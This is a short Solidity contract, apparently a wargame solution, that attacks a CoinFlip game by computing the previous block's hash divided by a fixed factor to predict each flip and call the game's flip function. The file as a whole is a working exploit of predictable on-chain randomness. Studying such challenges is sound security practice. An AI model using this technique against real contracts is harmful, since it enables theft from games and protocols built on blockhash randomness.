// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface CoinFlipInterface{
    function flip(bool _guess) external returns (bool);
}

contract AttackCoinFlip{
  CoinFlipInterface coinflip;

  uint256 public consecutiveWins;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _CoinFlipAddress){
    coinflip = CoinFlipInterface(_CoinFlipAddress);
  }

  function attack() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    bool r = coinflip.flip(side);
    consecutiveWins++;
  }
}